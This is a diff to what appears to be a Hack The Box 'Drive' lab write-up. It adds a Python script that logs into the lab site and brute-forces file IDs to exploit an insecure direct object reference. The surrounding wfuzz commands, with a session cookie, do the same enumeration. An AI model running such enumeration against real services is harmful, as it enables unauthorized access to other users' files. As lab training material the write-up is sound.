@@ -114,7 +114,7 @@ for i in $(seq 100 200); do echo "[+] File $i content --> "; curl -s -X GET http
 <img src="{{ site.img_path }}/drive_writeup/Drive_015.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
 <br /><br />
 
-To leak information in a clearer and more elegant way, I can use **BurpSuite** as a proxy, capture the requests and with the **Intruder** functionality perform a sniper attack. Depending on the response code I find information that I am only allowed to access if I am authorized, but I confirm that they exist. I can also perform this search with `wfuzz`.
+To leak information in a clearer and more elegant way, I can use **BurpSuite** as a proxy, capture the requests and with the **Intruder** functionality perform a sniper attack. Depending on the response code I find information that I am only allowed to access if I am authorized, but I confirm that they exist. I can also perform this search with `wfuzz`. The **[hack4u](https://hack4u.io/){:target="_blank"}** community also developed a python script that automates the exploitation of **IDOR** to find hidden files.
 
 ```bash
 burpsuite &>/dev/null & disown
@@ -122,6 +122,75 @@ wfuzz -c --hc=404,500 -z range,1-200 -b 'sessionid=advr7jpfnh5lzuahh3pqbl820p439
 #    :)
 wfuzz -c --hc=404,500 -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-words.txt -b 'sessionid=advr7jpfnh5lzuahh3pqbl820p439jdx' http://drive.htb/113/FUZZ
 #    block!
+```
+
+> **getFileIds.py** script:
+
+```python
+#!/usr/bin/python
+
+import requests
+import sys
+import pdb
+import re
+import signal
+import time
+
+from pwn import *
+from termcolor import colored
+
+class HTBDriveBruteForcer:
+
+    def __init__(self, base_url):
+        self.base_url = base_url
+        self.login_url = f"{self.base_url}/login/"
+        self.session = requests.session()
+        self.p1 = log.progress("Brute Force")
+        signal.signal(signal.SIGINT, self.def_handler)
+
+    def def_handler(sig, frame):
+        print(colored(f"\n\n[!] Close script ..\n", 'red'))
+        sys.exit(1)
+
+    def getCsrfToken(self):
+        
+        r = self.session.get(self.login_url)
+        token = re.findall(r'name="csrfmiddlewaretoken" value="(.*?)"', r.text)[0]
+
+        return token
+
+    def login(self, username, password):
+
+        post_data = {
+            'csrfmiddlewaretoken': self.getCsrfToken(),
+            'username': username,
+            'password': password
+        }
+
+        r = self.session.post(self.login_url, data=post_data)
+
+    def bruteForceIds(self):
+
+        self.p1.status("Brute Force Attack initiated")
+
+        time.sleep(2)
+
+        for id in range(0, 500):
+            self.p1.status(f"Tested identifiers [{id}/500]")
+            file_url = f"{self.base_url}/{id}/getFileDetail/"
+
+            r = self.session.get(file_url)
+
+            if r.status_code != 500:
+                print(colored(f"\n[+] ID [{id}]: {r.status_code}", 'yellow'))
+
+        self.p1.success("Brute-force attack successfully completed")
+
+if __name__ == '__main__':
+
+    brute_forcer = HTBDriveBruteForcer('http://drive.htb')
+    brute_forcer.login('{username}','{password}')
+    brute_forcer.bruteForceIds()
 ```
 
 <br />
